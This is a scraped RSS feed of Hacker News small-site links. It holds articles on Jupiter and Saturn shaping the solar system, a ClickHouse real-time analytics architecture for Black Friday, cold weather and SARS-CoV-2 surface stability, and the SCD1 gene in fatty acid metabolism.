â€œsuper-Earthâ€ and moved inward, onto a roasting-hot orbit close to the Sun. Not great for life.</p><p>Planets grow out of dust. It drifts around in a disk, then piles up to form 100 kilometer-scale â€œplanetesimals,â€ the real building blocks of the planets. Think of these like the potato-shaped asteroids from <i><a href="http://nautil.us/blog/the-emodiversity-of-star-wars" target="_blank">Star Wars</a></i>â€”just bigger, farther apart, and without the giant space slugs. The rings in the ALMA image are pile-ups of sand-sized dust, where these objects may be forming right now.</p><p>Planetesimals grow further by bashing into each other, and also by sweeping up dust drifting inward. When a growing planetesimal gets massive enough, it blocks the drifting dust, not only starving itself but also blocking the dust from getting to any planetesimal closer to the Sun. These planetesimals can keep growing by self-collisions but not by any new dust originating in the outer solar system.</p><p>Jupiterâ€™s growing coreâ€”a super-big planetesimal about ten times the mass of Earthâ€”may have done exactly that. It grew big enough, fast enough, to stop the flow of dust. Scientists donâ€™t know exactly why Jupiterâ€™s core formed so much faster than Earthâ€™s, but the reason likely has something to do with the fact that Jupiter started forming further from the Sun, where (sticky) ices could exist and contribute to its growth.&nbsp;</p><p>Meteorites corroborate this idea. The thousands of meteorites in NASA <a href="https://ares.jsc.nasa.gov/astromaterials3d/" target="_blank">collections</a> can be divided into two main classes, based on their isotopesâ€”the relative amounts of the same elements with different numbers of neutrons. These meteorites are made out of dust thatâ€™s just the right size to drift really fast within the disk. Yet the two types of meteorites didnâ€™t mix. Why not? Jupiterâ€™s dust-blocking core.</p><p>Our system was neatly just sliced right in two<span><br></span>As Jupiterâ€™s core stopped the dust flowing through.<span><br></span>If not for this, Earth would have just kept on growing <span><br></span>And wound up so close to the Sun weâ€™d be glowing!</p><p>Jupiter and Saturn also stunted Marsâ€™ growth. The Red Planet gets a lot of press, but itâ€™s a runt. Mars is nine times less massive than its closest neighbor, Earth. Decades of computer simulations (starting in the late 1970s) have shown that, without an outside perturbation, Mars would have grown to be about as big as Earthâ€”even with Jupiter blocking the flow of dust into the inner solar system.</p><figure data-alt=""><img src="http://static.nautil.us/18039_62b4521aec8fe13ad75560a2b41b2f95.jpg" width="733" alt=""></figure><figure data-alt=""><img src="http://static.nautil.us/18040_152c97a9bb6f2ababc2c73a46cfef7a3.jpg" width="733" alt=""><figcaption><span><i>The actual inner solar system (top), and what the inner solar system would look like today if not for a strong outside perturbation during the planetsâ€™ growth (bottom; according to computer simulations).</i></span><span>planetplanet.net</span></figcaption></figure><p>So why isnâ€™t Mars bigger? There are a few different ideas out there. One scenarioâ€”called the <a href="https://planetplanet.net/2013/08/02/the-grand-tack/" target="_blank">Grand Tack</a>â€”has Jupiterâ€™s orbit shifting, or â€œmigrating,â€ as it grew. On its own, Jupiter would have migrated inward and probably ended up somewhere close to Earthâ€™s orbit, which is where most of the Jupiter-mass planets around other stars are found.</p><p>This is where Saturn comes in. Jupiter and Saturn together migrate outward instead of inward. This is a neat hydrodynamical effect that takes place when two gas giants are close to each other in the same disk, and the inner one is more massive than the outer one. The flow of gas changes and creates a pileup interior to the inner planetâ€™s orbit, which acts to push both planets outward. Like two good friends, they have the wherewithal to go against the flow and migrate outward together, whereas each would migrate inward on its own.</p><figure data-alt=""><img src="http://static.nautil.us/18041_a4396f61160d9bfa1ea9114dacd37247.png" width="733" alt=""><figcaption><span><i>A hydrodynamical simulation of Jupiter and Saturn (circled) migrating in the sunâ€™s disk.</i></span><span>Arnaud Pierens</span></figcaption></figure><p>Jupiter and Saturnâ€™s migration emptied out Marsâ€™ feeding zone, stunting its growth. As long as their migration turned around (â€œtackedâ€ in sailing jargon) early enough, the gas giants would not have disrupted Earthâ€™s growth.&nbsp;</p><p>Like dinosaurs, Saturn and Jupiter roamed<span><br></span>They sculpted this system that humans call home<span><br></span>Their orbits first shrank, then shifted and grew.<span><br></span>Our Earth was constructed from rocks they plowed through.</p><p>We may be observing something similar in another system almost 400 light-years away. The disk around the star PDS70 appears to be shaped by two giant baby planets, locked in an orbital resonance, and migrating around right now!&nbsp;</p><figure data-alt=""><img src="http://static.nautil.us/18042_7e132d103ce54fda527e88a13a3d1540.png" width="733" alt=""><figcaption><span><i>Artistâ€™s impression of the exoplanets PDS70 b and c as they are migrating around within their birth disk.</i></span><span>J. Olmsted (StSci)</span></figcaption></figure><p>The gas giants eventually became unstable, pelting all of the other, more inner planets with stray rocks and ice. There are several pieces of circumstantial evidence leading scientists to suspect that our solar system suffered a dynamical instability, an event during which the giant planetsâ€™ orbits changed in sudden, dramatic fashion. For instance, the giant planetsâ€™ orbits are not circles, but modestly stretched out ellipses. The Kuiper belt is almost empty, yet Pluto and Eris, another dwarf planet (discovered in 2005), needed a lot more mass to grow as big as they are. The giant planets are surrounded by clouds of â€œirregular satellitesâ€ that seem to have been captured from somewhere else. The orbits of Jupiterâ€™s Trojan asteroids are strangely tilted. The list goes on.</p><div id="inpagesub">
	<p>Get the <span>Nautilus</span> newsletter</p>
<p>
	The newest and most popular articles delivered right to your inbox!
</p>
			<!-- Begin MailChimp Signup Form -->
			




</div><p>The <a href="https://en.wikipedia.org/wiki/Nice_model" target="_blank">Nice model</a>, a scenario of how our solar system dynamically evolved, developed in the French city of the same name, proposes that the giant planetsâ€™ orbits went unstable hundreds of millions of years after the planets formed (more on that later). The instability may looked something like this:&nbsp;</p><figure data-alt=""><img src="http://static.nautil.us/18043_877d85181eb41f6b8db45bd2d29a97b4.png" width="733" alt=""><figcaption><span><i>Snapshots of the giant planetâ€™s instability (from a computer simulation). The colored lines represent the orbits of the giant planets, and the white dots are leftover planetesimals.</i></span><span>Gomes et al. 2005 / Wikicommons</span></figcaption></figure><p>During the instability, the ice giants, Uranus and Neptune, were kicked all over the place. The outer disk of planetesimalsâ€”basically, a huge pile of leftover cometsâ€”was almost completely cleared out. Those leftovers rained down on the planets and a few were captured (like the irregular satellites).</p><p>And later on there was a big instability<span><br></span>This time the giants expressed their hostility<span><br></span>The ice giantsâ€™ orbits were strongly affected<span><br></span>An extra one may have been fully ejected!<span><br></span>(The Earth was bombarded; no planet protected.)</p><p>There is a new twist in this story related to the timing of these events. As you know, the Moon is covered in craters. Since the 1970s, the ages of craters were thought to show a big spike in the rate of impacts hundreds of millions of years after the planets formed (remember, that was still billions of years ago). This was called the â€œlate heavy bombardment.â€&nbsp;</p><p>New analysis shows that this spike is probably just the tail end of an early bombardment, the one that grew the planets in the first place. Not a â€œlateâ€ heavy bombardment. This doesnâ€™t call the past instability into question, because it can explain so many features of the solar system at the same time. But it must have happened much earlier, maybe during the growth of the rocky planets. Thereâ€™s a cherry on top: New simulations show that an early giant-planet instability can even <a href="https://planetplanet.net/2018/05/29/mars-growth-stunted/" target="_blank">explain</a> why Mars is smaller than Earth.&nbsp;</p><p>In modeling events billions of years ago, we are really only constrained by two things: the laws of physics (and available evidence) and our imaginations.</p><p>We donâ€™t have a time machine, canâ€™t see the past<span><br></span>But models can answer some questions weâ€™ve asked<span><br></span>To test our ideas, we use simulations<span><br></span>On giant computers, with huge calculations.</p><p>Some people like to call Jupiter and Saturn the â€œarchitectsâ€ of the solar system, as though they had a clear plan for how our system should turn out. Not us. We think of the gas giants as bullies that pushed Earth around and made a lot of decisions for us.</p><p>Some even call Jupiter Earthâ€™s â€œprotector.â€ This is because, over the past 4 billion years, its massive gravity has scattered comets and asteroids away that might otherwise have hit our planet. But on closer inspection, this doesnâ€™t hold up. Jupiter only protects Earth from comets that Jupiter put on Earth-crossing orbits in the first place. Itâ€™s like a bullyâ€”albeit, quite a beautiful oneâ€”asking for a handout to protect you from his fist.</p><p><i>Sean Raymond is an American astrophysicist working at the Bordeaux Astrophysical Laboratory in France. He also writes a blog at the â€¦</i></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://m.nautil.us/blog/the-sight-of-jupiter-and-saturn-together-is-a-beautiful-thing">http://m.nautil.us/blog/the-sight-of-jupiter-and-saturn-together-is-a-beautiful-thing</a></em></p>]]>
            </description>
            <link>http://m.nautil.us/blog/the-sight-of-jupiter-and-saturn-together-is-a-beautiful-thing</link>
            <guid isPermaLink="false">hacker-news-small-sites-25495448</guid>
            <pubDate>Mon, 21 Dec 2020 14:58:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Processing 12T rows during Black Friday]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25495440">thread link</a>) | @xoelop
<br/>
December 21, 2020 | https://blog.tinybird.co/2020/12/21/how-we-setup-real-time-analytics-service-to-process-12-trillion-rows-during-black-friday/ | <a href="https://web.archive.org/web/*/https://blog.tinybird.co/2020/12/21/how-we-setup-real-time-analytics-service-to-process-12-trillion-rows-during-black-friday/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <div> <article itemscope="" itemtype="http://schema.org/BlogPosting">  <div id="post-content" itemprop="articleBody"> <p><em>By <a href="https://twitter.com/javisantana">Javi Santana</a></em></p> <p>One month before Black Friday, one of our clients in the retail space asked us to host for them the real time analytics API that feeds the dashboards that everyone in the company uses to see whatâ€™s going on (and of course, make decisions based on it).</p> <p>We knew it was tight but we specialize in running real-time stuff at scale: for example, while at Carto we served the Wall Street Journal frontpage map on 2012 during the election night, we hosted a website with a link from google.comâ€™s home page (and a bunch of other countries) for 24 hours and some other high load events.</p> <p>In an ideal world you would setup a Kafka cluster, a streaming system to materialize some metrics on some fast key value store like redis and serve them using a lightweight backend through an API. With that you would get likely thousands of requests per second without much hardware.</p> <p>And while we can easily ingest Kafka streams, not every company works with streams, not all analytics can be precalculated easily and not all dashboards are simple counters.</p> <p>In this case we had to deal with data from a transactional database. And the analytics needed to be flexible due to filtering requirements as well as different configurations that needed to be changed on the fly and reflected instantly on the dashboard.</p> <h2 id="the-data-input">The data input</h2> <p>In order to â€œstreamâ€ data from the transactional database to our system, the client set up 5 parallel threads sending once per second all the rows that changed during the last second. Sounds easy but it gets complicated - wait for it.</p> <p>That means that even when just a column changes in an already existing row, the row needs to be sent again. And in a system like this, rows change quite a lot. Of course there are better ways to do this but for the use case it was good enough and allowed them to have high quality data (one of the requirements of the project)</p> <h2 id="the-infrastructure">The infrastructure</h2> <p>We used our product for the setup. It looks like:</p> <ul> <li>An Nginx load balancer</li> <li>A Varnish behind Nginx</li> <li>Our Tinybird backend. It runs the API endpoints, the load balancing for Clickhouse replicas and also the ingestion part. Itâ€™s a Python application with small bits of C++ for critical request paths.</li> <li>A Clickhouse cluster</li> <li>A Zookeeper cluster for data replication within Clickhouse</li> </ul> <p>Itâ€™s pretty simple (because we like to keep things as simple as possible) and using components we know pretty well. To be clear, in this case the amount of QPS was not going to be crazy high (less than 200QPS) so Nginx and Varnish acted just as routing tools with not so much load (more on this later) but any other load balancer would work pretty well too.</p> <h2 id="the-initial-numbers">The initial numbers</h2> <p>The plan was to have between 50-100QPS (with 120 QPS peaks) with a response time under 150ms over datasets with some millions of rows (trying not to be too specific here on purpose). The queries were not simple: they needed several joins with tables which were changing quite often so we couldnâ€™t precalculate too many things.</p> <p>Around 5 ingestions happened per second with millions of rows ingested per minute.</p> <p>Every hour, many millions of rows would be imported to resync last hoursâ€™ with changes that might had been missed in the original database.</p> <h2 id="the-approach">The approach</h2> <p>The best way to run any analytics service is to serve static data. Thatâ€™s the perfect world because it is inexpensive and fast as hell.</p> <p>With dynamic data, what you want to do is to convert the data as itâ€™s ingested into static data so that you only process the data once. Thatâ€™s possible when the amount of combinations you have to generate is low. A static blog generator with a few posts a day is one example of this.</p> <blockquote> <p>But when the amount of combinations is high you have to process the data as it comes in as much as you can so itâ€™s fast to query, but taking into account the processing time should be low because you donâ€™t want to add lag (if not, it would not be real-time)</p> </blockquote> <p>Our product uses Clickhouse and thatâ€™s what we used for the data storage and queries. Itâ€™s almost perfect for this use case: it allows to run queries over large amounts of data pretty fast, the latency is low and scales horizontally and vertically.</p> <p>So the plan was easy: using materialized views from Clickhouse, generating views to cover the most frequent use cases. Take into account that Clickhouse matviews are incremental - you donâ€™t need to recalculate the whole view when new data is added. If you use Clickhouse and you are not using them you should take a look, you may save several orders or magnitude in query time.</p> <h2 id="ingestion">Ingestion</h2> <p>But there is one big problem: as I said we need to run upserts because the data comes from a transactional database. And Clickhouse (like other databases in the same space) doesnâ€™t deal with upserts in real time.</p> <p>So what we did was to <em>split the main table</em>, the one with all the sales, in two: one (we call it RT) for the latest 30 minutes and another one for the rest (HISTORIC). Each table has the same materialized views but obviously they are different.</p> <p>The RT one is really easy to work with because the amount of rows in there is not going to be crazy, so we can recalculate it completely to run the upserts in real time. It takes less than 1 second with several million rows to run all the upserts and recalculate all the mat views for that â€œsmallâ€ table.</p> <p>The HISTORIC one works as an incremental table and data older than 30 minutes is appended to the table. We donâ€™t expect too many changes in rows after 30 minutes, thatâ€™s why we move data to this table.</p> <p>For rows that change after 30 minutes we run an hourly process to update parts of the HISTORIC table and recalculate all the materialized views for that table, only for data that has changed.</p> <p>The important part: we run this in several machines but taking into account we can never return inconsistent results, every operation needs to be aware of replication lag (pretty low I have to say) and run all the changes in an atomic way. This sounds easy but it isnâ€™t; however, it is something that comes out of the box with Tinybird so we didnâ€™t have to pay too much attention to it.</p> <p>For the table schema we tried to use the smallest possible data types to save as much space as possible since everything should be in memory to be fast. Also we used LZ4 compression (default for Clickhouse) since it provides a good ratio between compression and decoding speed, so it saves quite a lot of memory bandwidth.</p> <p>In order to optimize the ingestion process we also used one of the recently added features in Clickhouse, the in memory data parts, that lets you insert rows into a MergeTree table without actually syncing them to disk, which improves performance. All the tables were replicated (multi-master) so in case of a problem with the machine running the ingestion processes, we could switch to a different one without downtime. Data loss was really unlikely since the ingestion process would send the rows again in case of a failed insert.</p> <h2 id="querying">Querying</h2> <p>Once you have the materialized views, the queries are easy: just regular SQL following the real time rules:</p> <ul> <li>The best data is the one you donâ€™t have to read. Using Clickhouse indexing to skip non needed data is key</li> <li>Lightweight operations first: filtering always goes first.</li> <li>Replacing joins with â€œWHERE column IN (SELECT â€¦)â€ when possible, generally much faster. Using <a href="https://gist.github.com/javisantana/07c689564874cea6e4a31bd40fc770b1">transform function</a> when possible.</li> <li>Monitoring and optimizing query times, but also minimising the amount of bytes scanned. We always aim to scan as few bytes as possible in the first steps of the query and then try optimize to reduce the times. We split queries in several chunks so we know how many resources each part of the query takes, see <a href="https://ui.tinybird.co/snapshot/7437e5efa1f944a0b7cc017751696ea3">an example</a>.</li> </ul> <p>Also to be able to run queries over two tables without overlapping data, we used a simple but powerful technique: using a table to store the split date.</p> <div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
</pre></td><td><pre><span>WITH</span> <span>(</span>
   <span>select</span> <span>split_date</span> <span>from</span> <span>split_table</span>
<span>)</span> <span>as</span> <span>split_date</span>
<span>select</span> <span>â€¦</span> <span>from</span> <span>historic</span> <span>where</span> <span>date</span> <span>&lt;</span> <span>split_date</span>
<span>union</span> <span>all</span>
<span>WITH</span> <span>(</span>
   <span>select</span> <span>split_date</span> <span>from</span> <span>split_table</span>
<span>)</span> <span>as</span> <span>split_date</span>
<span>select</span> <span>â€¦</span> <span>from</span> <span>RT</span> <span>where</span> <span>date</span> <span>&gt;=</span> <span>split_date</span>
</pre></td></tr></tbody></table></code></pre></div></div> <p>We have to run the Common Table Expression twice because its scope only covers one select, something that is being improved in Clickhouse as I write this.</p> <p>The objective was to run all the queries under 150ms with just one core. This is important because there was a lot of concurrency and also we have to leave some spare cores to work on the ingestion process. In our standard setup the load balancer routes more read requests to the machines not ingesting data at that moment so query time percentiles stay low.</p> <p>For the read load balancer we used a round-robin policy (all the requests take more or less the same time) but ideally the load balancer should try to route requests that use the same part of the data to the same machines to use caching as much as possible. In this case it wasnâ€™t critical because the tables we were querying were not huge and we were running in large machines (32 cores, 64gb ram), so read tables fit in memory.</p> <p>We also used Varnish to avoid duplicate requests. When running dashboards, itâ€™s pretty common for many browsers to request the same url at the same time, so using <a href="https://varnish-cache.org/docs/trunk/users-guide/vcl-grace.html#grace-mode">Varnish grace mode</a> we avoided extra work in the database.</p> <p>Varnish was also ready for plan B: in case of an unexpected load peak well outside of our predictions, we could enable caching with a small TTL to save some requests to the database.</p> <blockquote> <p>One final comment: we optimized queries and materialized views taking into account the distribution of calls to different endpoints. Itâ€™s much better to speed up an endpoint which is run 80% of the times than another one which is 2x slower.</p> </blockquote> <p>And this sounds like obvious but developers sometimes forget about two things: basic maths and the big picture. If you are interested we published a blog post on <a href="https://blog.tinybird.co/2020/12/15/eating-our-own-dog-food-how-we-investigate-performance-bottlenecks-using-our-product-and-google-sheets/">how we optimize our endpoints based on basic statistics</a></p> <h2 id="final-numbers-and-results">Final numbers and results</h2> <p>Numbers after Black Friday days (4 in our case):</p> <ul> <li>We ingested +650B rows.</li> <li>All the queries read a total of â€¦</li></ul></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.tinybird.co/2020/12/21/how-we-setup-real-time-analytics-service-to-process-12-trillion-rows-during-black-friday/">https://blog.tinybird.co/2020/12/21/how-we-setup-real-time-analytics-service-to-process-12-trillion-rows-during-black-friday/</a></em></p>]]>
            </description>
            <link>https://blog.tinybird.co/2020/12/21/how-we-setup-real-time-analytics-service-to-process-12-trillion-rows-during-black-friday/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25495440</guid>
            <pubDate>Mon, 21 Dec 2020 14:56:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cold Weather Increases Fomite Spread of SARS-CoV-2]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25495380">thread link</a>) | @bookofjoe
<br/>
December 21, 2020 | https://smosa.com/bad-news-cold-weather-will-help-the-spread-of-sars-cov-2/ | <a href="https://web.archive.org/web/*/https://smosa.com/bad-news-cold-weather-will-help-the-spread-of-sars-cov-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

					<!-- .post-header -->


					<div>
						<p>The holiday season is still not done delivering bad news. With ICUs at 0% capacity in some parts of the United States, Public health officials wonder if the seasonal change alone will affect the transmission of SARS-CoV-2. A recent research study has studied the influence of temperature and humidity on the properties of individual virus-likes.</p><blockquote>When it comes to fighting the spread of this virus, you kind of have to fight every particle individually. And so you need to understand what makes each individual particle degrade. People are also working on vaccines and are trying to understand how the virus is recognized? All of these questions are single particle questions. And if you understand that, then that enables you to fight a hoard of them.</blockquote><p>The results indicate cold weather could have a preserving effect on the virus. The first study to evaluate the mechanics of the virus at a single particle stage, found that other coronaviruses tend to infect more people during the winter months.</p><figure><img src="https://smosa.com/content/images/2020/12/Picture1.png" alt="" srcset="https://smosa.com/content/images/size/w600/2020/12/Picture1.png 600w, https://smosa.com/content/images/size/w1000/2020/12/Picture1.png 1000w, https://smosa.com/content/images/2020/12/Picture1.png 1302w" sizes="(min-width: 720px) 720px"><figcaption>Source: <a href="https://edition.cnn.com/interactive/2020/health/coronavirus-us-maps-and-cases/">CNN; Johns Hopkins University</a></figcaption></figure><p>"You would expect that temperature makes a huge difference, and that's what we saw. To the point where the packaging of the virus was completely destroyed by even moderate temperature increases," said Michael Vershinin, assistant professor at the University of Utah and co-senior author of the paper. "What's surprising is how little heat was needed to break them down -- surfaces that are warm to the touch, but not hot. The packaging of this virus is very sensitive to temperature."</p><figure><img src="https://images.unsplash.com/photo-1491002052546-bf38f186af56?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fHdpbnRlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="Snowshoeing on a snowy day at Gold Creek Pond." srcset="https://images.unsplash.com/photo-1491002052546-bf38f186af56?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fHdpbnRlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=600 600w, https://images.unsplash.com/photo-1491002052546-bf38f186af56?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fHdpbnRlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1000 1000w, https://images.unsplash.com/photo-1491002052546-bf38f186af56?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fHdpbnRlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1600 1600w, https://images.unsplash.com/photo-1491002052546-bf38f186af56?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fHdpbnRlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2200 2200w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@sametomorrow?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Adam Chang</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><p>The SARS-CoV-2 virus is typically transmitted by spreading respiratory particles (e.g. sneezing or coughing), which ejects droplets of the microscopic aerosols from the lungs. These mucus droplets have a high volume-to-surface ratio and dry fast, so that wet and dry virus particles come in contact with a surface.</p><p>Scientists examined virus-like particles on both dry and humid glass surfaces. They found relatively little variation between humidity levels on the surfaces. But scientists point out that humidity potentially matters when the particles in the air by impacting how easily the aerosols dry out.</p>
					</div><!-- .post-content -->

					<!-- .post-footer -->


				</article></div>]]>
            </description>
            <link>https://smosa.com/bad-news-cold-weather-will-help-the-spread-of-sars-cov-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25495380</guid>
            <pubDate>Mon, 21 Dec 2020 14:49:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SCD1 â€“ Genetics, Metabolism, Neurodegeneration]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25495335">thread link</a>) | @parsimony
<br/>
December 21, 2020 | https://www.geneticlifehacks.com/scd1-a-lynchpin-of-metabolism/ | <a href="https://web.archive.org/web/*/https://www.geneticlifehacks.com/scd1-a-lynchpin-of-metabolism/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			<p>There is a growing body of evidence showing that many of our current chronic diseases (diabetes, metabolic syndrome, obesity) all revolve around the balance of utilizing fatty acids for energy, normalizing blood glucose levels, and maintaining a healthy muscle mass and weight. The SCD1 gene impacts all of these topics.</p>
<p>This article explains the function of stearoyl-CoA desaturase 1 (SCD1) and then dives into the genetic variants that impact your base levels. We will end with the research on how diet impacts SCD1 and how you may be able to manipulate it for weight loss.</p>

<h2><span id="StearoylCoA_Desaturase_1_%E2%80%93_converting_fatty_acids_in_your_cells"></span>Stearoyl-CoA Desaturase 1 â€“ converting fatty acids in your cells<span></span></h2>
<p>Stearoyl-CoA desaturase (SCD1 gene) is the rate-limiting enzyme needed for the bodyâ€™s creation of monounsaturated fatty acids from saturated fatty acids.</p>
<p>First, some background information for context (skip ahead if you know this), and then Iâ€™ll get into the SCD1 gene and how it affects overall health, weight, and metabolic health.</p>
<h3><span id="Background_how_your_body_uses_food_as_fuel"></span>Background: how your body uses food as fuel<span></span></h3>
<p>Your cells create energy from <strong>two fuel sources: carbohydrates</strong>, which break down into glucose, <strong>and fat</strong>, which can be utilized in fatty acid oxidation for energy. When glucose is available, it is used preferentially for creating energy, and when glucose levels fall, fatty acids get used for energy.</p>
<p>We survive as a species because we are flexible in our ability to survive eating different diets â€” from hunter-gatherers eating mammoths and tubers to agrarian cultures eating mainly grains to my Irish ancestors who likely made it through famine times eating potatoes.</p>
<p><img src="https://i1.wp.com/www.geneticlifehacks.com/wp-content/uploads/2020/12/fat-fuel.jpg?resize=100%2C100&amp;ssl=1" alt="" width="100" height="100" srcset="https://i1.wp.com/www.geneticlifehacks.com/wp-content/uploads/2020/12/fat-fuel.jpg?w=100&amp;ssl=1 100w, https://i1.wp.com/www.geneticlifehacks.com/wp-content/uploads/2020/12/fat-fuel.jpg?resize=96%2C96&amp;ssl=1 96w" sizes="(max-width: 100px) 100vw, 100px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/www.geneticlifehacks.com/wp-content/uploads/2020/12/fat-fuel.jpg?w=100&amp;ssl=1 100w, https://i1.wp.com/www.geneticlifehacks.com/wp-content/uploads/2020/12/fat-fuel.jpg?resize=96%2C96&amp;ssl=1 96w" data-lazy-src="https://i1.wp.com/www.geneticlifehacks.com/wp-content/uploads/2020/12/fat-fuel.jpg?resize=100%2C100&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>The body can convert glucose into fat for storage(called <em>de novo lipogenesis</em>), and it can convert fat back into glucose if needed (<em>gluconeogenesis</em>). While most cells can run on fatty acids for fuel, the brain needs glucose and thus the conversion of fat to glucose if needed.</p>
<p>When you eat foods containing fat, the fat gets broken down in a couple of ways with different lipase enzymes. These lipase enzymes (gastric, pancreatic) break up the fat into fatty acids and glycerol, and then bile acids act as emulsifiers, allowing the fatty acid to cross the mucous layer for absorption. (more thorough <a href="https://med.libretexts.org/Bookshelves/Nutrition/Book%3A_An_Introduction_to_Nutrition_(Zimmerman)/05%3A_Lipids/5.04%3A_Digestion_and_Absorption_of_Lipids#:~:text=In%20the%20stomach%20fat%20is,fats%20through%20the%20lymph%20system." target="_blank" rel="noopener noreferrer">explanation here</a>)</p>
<h4><span id="Background_Fatty_acids_in_the_body"></span>Background: Fatty acids in the body<span></span></h4>
<p>While we often just think of â€˜fatâ€™ as the extra padding around our waist and hips, fatty acids have <strong>three different roles</strong> in the body:</p>
<ol>
<li>Fatty acids, mainly unsaturated fatty acids, make up the<strong> cell membranes</strong> of all the cells in the body.</li>
<li>Fatty acids can break down for the mitochondria use them to create <strong>energy</strong> in the form of ATP. Fatty acids are also the main way of storing fuel for later use.</li>
<li>Fatty acids can act as <strong>signaling molecules</strong>, causing many different downstream effects.</li>
</ol>
<p>So keep in mind that as we dig into this topic of saturated and monounsaturated fatty acids, the body is regulating and using these fats in multiple ways.</p>
<h4><span id="Background_Types_of_fatty_acids"></span>Background: Types of fatty acids<span></span></h4>
<p>Fatty acids consist of carbon and hydrogen and referred to as saturated or unsaturated. Saturated fats have all of their carbons bound to hydrogens, and unsaturated fats have at least one carbon bound to another carbon instead of a hydrogen. This change in the structure of the fatty acid differentiates saturated from unsaturated fats.</p>
<p>Saturated fats are generally solids at room temperature, and unsaturated fats are liquids.</p>
<p>Fatty acids are named based on the number of carbons in the chain and how many unsaturated double bonds between carbons exist. Saturated fats have no unsaturated double bonds. Monounsaturated fatty acids (MUFA) have one unsaturated double bond, and polyunsaturated fatty acids (PUFA) have two unsaturated double bonds.</p>
<table>
<tbody>
<tr>
<td><strong>Saturated fatty acids (# carbon atoms):</strong>
<ul>
<li>Caprylic acid (8)</li>
<li>Capric acid (10)</li>
<li>Lauric acid (12)</li>
<li>Myristic acid (14)</li>
<li>Palmitic acid (16)</li>
<li>Stearic acid (18)</li>
<li>Arachidic acid (20)</li>
</ul>
</td>
<td><strong>Unsaturated fatty acids (# carbon atoms, # unsaturated double bonds):</strong>
<ul>
<li>Myrisoleic acid (14, 1)</li>
<li>Palmitoleic acid (16, 1)</li>
<li>Oleic acid (18,1)</li>
<li>Linoleic acid (18, 2)</li>
<li>Î±-Linolenic acid (18, 3)</li>
<li>Arachidonic acid (20, 4)</li>
<li>Eicosapentaenoic acid â€“ EPA (20, 5)</li>
<li>Docosahexaenoic acid â€“ DHA (22, 6)</li>
</ul>
</td>
</tr>
</tbody>
</table>
<h3><span id="SCD1_converting_saturated_fat_to_monounsaturated_fat"></span>SCD1: converting saturated fat to monounsaturated fat<span></span></h3>
<p>Getting back on topic here, the stearoyl-CoA desaturase enzyme is found in all cell types and in all animals and plants. The SCD1 gene codes for the stearoyl-CoA desaturase enzyme which converts saturated fatty acids into monounsaturated fatty acids.</p>
<p>The cell membrane surrounding all of your cells consists of fatty acids. Some of those fatty acids can be saturated, but most of them need to be unsaturated, in order to give more fluidity to the cell membrane. Saturated fats, which are solids at room temperature, are less fluid in cell walls.</p>
<p>The stearoyl-CoA desaturase enzyme changes the bond in the saturated fat to make it unsaturated and more flexible.</p>
<p>Specifically, the SCD enzyme converts stearic acid (saturated fat with 18 carbons) into oleic acid (unsaturated fat, 18 carbons, and one unsaturated double bond).&nbsp; It can also convert palmitic acid into palmitoleic acid.</p>
